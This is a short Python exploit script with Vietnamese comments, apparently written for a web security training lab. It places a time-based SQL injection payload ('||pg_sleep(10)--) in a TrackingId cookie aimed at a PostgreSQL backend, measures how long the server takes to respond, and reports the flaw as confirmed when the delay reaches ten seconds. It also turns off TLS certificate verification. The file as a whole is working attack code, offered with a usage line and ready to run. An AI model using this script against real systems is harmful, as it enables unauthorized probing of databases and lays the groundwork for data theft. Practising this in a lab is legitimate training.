import requests
import time
import sys

# Tắt cảnh báo SSL không an toàn (do Lab sử dụng HTTPS tự ký)
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


def exploit_time_delay(url):
    print(f"[+] Đang kiểm tra lỗ hổng Time-based SQLi tại: {url}")

    # Payload gây trễ 10 giây cho PostgreSQL
    # URL encoded của: '||pg_sleep(10)--
    sql_payload = "'||pg_sleep(10)--"

    cookies = {
        'TrackingId': f'ANY_VALUE{sql_payload}',
        'session': 'YOUR_SESSION_COOKIE_HERE'  # Thay thế bằng session thực tế của bạn
    }

    start_time = time.time()

    try:
        # Gửi request với verify=False để bỏ qua lỗi chứng chỉ
        response = requests.get(url, cookies=cookies, verify=False)
        end_time = time.time()

        duration = end_time - start_time
        print(f"[*] Thời gian phản hồi: {duration:.2f} giây")

        if duration >= 10:
            print("[!] THÀNH CÔNG: Lỗ hổng đã được xác nhận! Server bị delay đúng như dự kiến.")
        else:
            print("[-] THẤT BẠI: Thời gian phản hồi quá nhanh. Kiểm tra lại payload hoặc session.")

    except Exception as e:
        print(f"[x] Đã xảy ra lỗi: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Sử dụng: python exploit.py <URL_LAB>")
    else:
        lab_url = sys.argv[1]
        exploit_time_delay(lab_url)